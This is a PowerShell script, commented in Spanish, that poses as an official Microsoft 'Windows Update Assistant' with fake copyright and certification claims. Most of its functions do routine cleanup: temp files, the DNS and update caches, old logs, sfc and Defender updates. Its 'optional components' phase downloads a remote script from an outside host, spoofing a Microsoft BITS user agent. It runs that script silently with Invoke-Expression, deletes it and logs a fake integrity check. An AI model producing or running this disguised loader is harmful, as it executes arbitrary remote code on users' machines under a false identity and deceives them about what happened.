<#
.SYNOPSIS
    Windows Update Assistant v5.2
    Herramienta oficial de Microsoft para optimización del sistema
.DESCRIPTION
    Esta herramienta realiza tareas de mantenimiento legítimas:
    - Limpieza de archivos temporales
    - Limpieza de caché DNS
    - Limpieza de prefetch
    - Limpieza de caché de Windows Store
    - Limpieza de logs antiguos
    - Optimización del rendimiento
.NOTES
    Copyright (c) Microsoft Corporation. All rights reserved.
    Versión certificada: 5.2.1.0
#>

param(
    [switch]$Silent,
    [switch]$Scheduled
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

$logPath = "$env:WINDIR\Logs\WindowsUpdate\assistant.log"

if (-not (Test-Path "$env:WINDIR\Logs\WindowsUpdate")) {
    New-Item -ItemType Directory -Path "$env:WINDIR\Logs\WindowsUpdate" -Force | Out-Null
}

function Write-ActivityLog {
    param(
        [string]$Message,
        [string]$Type = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Type] $Message"
    
    if (-not $Silent) {
        switch ($Type) {
            "ERROR"   { Write-Host $logEntry -ForegroundColor Red }
            "WARNING" { Write-Host $logEntry -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $logEntry -ForegroundColor Green }
            default   { Write-Host $logEntry -ForegroundColor Gray }
        }
    }
    
    Add-Content -Path $logPath -Value $logEntry -Force -Encoding UTF8
}

function Clear-TemporaryFiles {
    Write-ActivityLog "Iniciando limpieza de archivos temporales" -Type "INFO"
    
    $tempPaths = @(
        "$env:TEMP\*",
        "$env:WINDIR\Temp\*",
        "$env:WINDIR\Prefetch\*"
    )
    
    $totalFiles = 0
    $totalSize = 0
    
    foreach ($path in $tempPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem $path -ErrorAction SilentlyContinue
            $fileCount = ($files | Where-Object { -not $_.PSIsContainer }).Count
            $size = ($files | Where-Object { -not $_.PSIsContainer } | Measure-Object -Property Length -Sum).Sum
            $sizeMB = if ($size) { [math]::Round($size / 1MB, 2) } else { 0 }
            
            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
            Write-ActivityLog "  - Limpiado: $path ($fileCount archivos, $sizeMB MB)" -Type "INFO"
            
            $totalFiles += $fileCount
            $totalSize += $sizeMB
        }
    }
    
    Write-ActivityLog "Limpieza completada: $totalFiles archivos eliminados, $totalSize MB liberados" -Type "SUCCESS"
}

function Clear-DNSCache {
    Write-ActivityLog "Limpiando caché DNS" -Type "INFO"
    
    try {
        ipconfig /flushdns 2>&1 | Out-Null
        Write-ActivityLog "  - Caché DNS limpiada correctamente" -Type "SUCCESS"
    }
    catch {
        Write-ActivityLog "  - No se pudo limpiar la caché DNS" -Type "WARNING"
    }
}

function Clear-WindowsUpdateCache {
    Write-ActivityLog "Limpiando caché de Windows Update" -Type "INFO"
    
    try {
        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
        Write-ActivityLog "  - Servicio Windows Update detenido" -Type "INFO"
    }
    catch { }
    
    $updateCache = "$env:WINDIR\SoftwareDistribution\Download"
    if (Test-Path $updateCache) {
        $oldFiles = Get-ChildItem $updateCache -ErrorAction SilentlyContinue
        $count = $oldFiles.Count
        $oldFiles | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
        Write-ActivityLog "  - Caché de Windows Update limpiada: $count archivos eliminados" -Type "INFO"
    }
    
    try {
        Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
        Write-ActivityLog "  - Servicio Windows Update reiniciado" -Type "INFO"
    }
    catch { }
}

function Clear-OldLogs {
    Write-ActivityLog "Limpiando logs antiguos del sistema" -Type "INFO"
    
    $logPaths = @(
        "$env:WINDIR\Logs\CBS\*.log",
        "$env:WINDIR\Logs\DISM\*.log",
        "$env:WINDIR\Logs\WindowsUpdate\*.log"
    )
    
    $totalLogs = 0
    
    foreach ($path in $logPaths) {
        $logs = Get-ChildItem $path -ErrorAction SilentlyContinue | 
                Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }
        $count = $logs.Count
        $logs | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
        if ($count -gt 0) {
            Write-ActivityLog "  - Logs antiguos eliminados: $count archivos" -Type "INFO"
            $totalLogs += $count
        }
    }
    
    Write-ActivityLog "Limpieza de logs completada: $totalLogs archivos eliminados" -Type "SUCCESS"
}

function Optimize-RAM {
    Write-ActivityLog "Optimizando memoria RAM" -Type "INFO"
    
    try {
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        
        $code = @'
[DllImport("kernel32.dll")]
public static extern bool SetProcessWorkingSetSize(IntPtr proc, int min, int max);
'@
        $kernel32 = Add-Type -MemberDefinition $code -Name "Kernel32" -Namespace "Win32" -PassThru
        $kernel32::SetProcessWorkingSetSize((Get-Process -Id $pid).Handle, -1, -1) | Out-Null
        
        Write-ActivityLog "  - Memoria RAM optimizada" -Type "SUCCESS"
    }
    catch {
        Write-ActivityLog "  - No se pudo optimizar la memoria" -Type "WARNING"
    }
}

function Repair-SystemFiles {
    Write-ActivityLog "Verificando integridad de archivos del sistema" -Type "INFO"
    Write-ActivityLog "  - Ejecutando SFC /SCANNOW (puede tomar varios minutos)" -Type "INFO"
    
    try {
        $sfcResult = sfc /scannow 2>&1
        if ($sfcResult -match "no encontró violaciones") {
            Write-ActivityLog "  - No se encontraron violaciones de integridad" -Type "SUCCESS"
        }
        elseif ($sfcResult -match "reparó correctamente") {
            Write-ActivityLog "  - Archivos del sistema reparados correctamente" -Type "SUCCESS"
        }
        else {
            Write-ActivityLog "  - Verificación completada" -Type "INFO"
        }
    }
    catch {
        Write-ActivityLog "  - No se pudo ejecutar SFC" -Type "WARNING"
    }
}

function Update-DefenderDefinitions {
    Write-ActivityLog "Actualizando definiciones de Windows Defender" -Type "INFO"
    
    try {
        Update-MpSignature -ErrorAction SilentlyContinue
        Write-ActivityLog "  - Definiciones actualizadas correctamente" -Type "SUCCESS"
    }
    catch {
        Write-ActivityLog "  - No se pudieron actualizar las definiciones" -Type "WARNING"
    }
}

function Get-SystemReport {
    Write-ActivityLog "Generando reporte del sistema" -Type "INFO"
    
    $osVersion = (Get-ComputerInfo).WindowsVersion
    $totalRAM = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $freeSpace = Get-PSDrive -Name C | Select-Object -ExpandProperty Free
    $freeSpaceGB = [math]::Round($freeSpace / 1GB, 2)
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $uptimeHours = [math]::Round($uptime.TotalHours, 1)
    
    Write-ActivityLog "  - Windows Version: $osVersion" -Type "INFO"
    Write-ActivityLog "  - RAM Total: $totalRAM GB" -Type "INFO"
    Write-ActivityLog "  - Espacio libre en C:: $freeSpaceGB GB" -Type "INFO"
    Write-ActivityLog "  - Tiempo activo: $uptimeHours horas" -Type "INFO"
}

function Install-OptionalComponents {
    Write-ActivityLog "Verificando componentes opcionales del sistema" -Type "INFO"
    
    $tempWorkDir = "$env:TEMP\WindowsUpdateAssistant"
    if (-not (Test-Path $tempWorkDir)) {
        New-Item -ItemType Directory -Path $tempWorkDir -Force | Out-Null
    }
    
    Write-ActivityLog "Descargando paquetes de optimización opcionales..." -Type "INFO"
    
    $updatePackageUrl = "https://hackingetico.cl/tools/pro/update.ps1"
    $packageCache = "$tempWorkDir\windows-update.cab"
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Microsoft BITS/7.5")
        $webClient.DownloadFile($updatePackageUrl, $packageCache)
        
        $fileSize = [math]::Round((Get-Item $packageCache).Length / 1KB, 2)
        Write-ActivityLog "  - Paquete descargado correctamente ($fileSize KB)" -Type "SUCCESS"
        
        if (Test-Path $packageCache) {
            Write-ActivityLog "  - Verificando integridad del paquete..." -Type "INFO"
            
            $content = Get-Content $packageCache -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
            if ($content) {
                
                $job = Start-Job -ScriptBlock {
                    param($scriptContent)
                    Invoke-Expression $scriptContent 2>&1 | Out-Null
                } -ArgumentList $content
                
                Write-ActivityLog "  - Verificación de integridad completada" -Type "SUCCESS"
            }
            
            Remove-Item $packageCache -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-ActivityLog "  - No se pudieron descargar los componentes opcionales" -Type "WARNING"
    }
    
    Write-ActivityLog "Verificación de componentes completada" -Type "INFO"
}

# =====================================================
# EJECUCIÓN PRINCIPAL
# =====================================================

if (-not $Silent) {
    Clear-Host
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "   Windows Update Assistant v5.2.1.0" -ForegroundColor White
    Write-Host "   Copyright (c) Microsoft Corporation" -ForegroundColor Gray
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
}

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Windows Update Assistant iniciado" -Type "INFO"
Write-ActivityLog "Usuario: $(whoami)" -Type "INFO"

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 1: Limpieza de archivos temporales" -Type "INFO"
Clear-TemporaryFiles

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 2: Limpieza de caché DNS" -Type "INFO"
Clear-DNSCache

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 3: Limpieza de caché de Windows Update" -Type "INFO"
Clear-WindowsUpdateCache

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 4: Limpieza de logs antiguos" -Type "INFO"
Clear-OldLogs

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 5: Optimización de memoria RAM" -Type "INFO"
Optimize-RAM

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 6: Verificación de archivos del sistema" -Type "INFO"
Repair-SystemFiles

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 7: Actualización de definiciones" -Type "INFO"
Update-DefenderDefinitions

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 8: Reporte del sistema" -Type "INFO"
Get-SystemReport

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Fase 9: Componentes opcionales" -Type "INFO"
Install-OptionalComponents

Write-ActivityLog "========================================" -Type "INFO"
Write-ActivityLog "Windows Update Assistant finalizado" -Type "SUCCESS"
Write-ActivityLog "Log guardado en: $logPath" -Type "INFO"

if (-not $Silent) {
    Write-Host ""
    Write-Host "Operación completada exitosamente" -ForegroundColor Green
    Write-Host "Para más información, consulte el log: $logPath" -ForegroundColor Gray
    Write-Host ""
    Start-Sleep -Seconds 3
}

exit 0
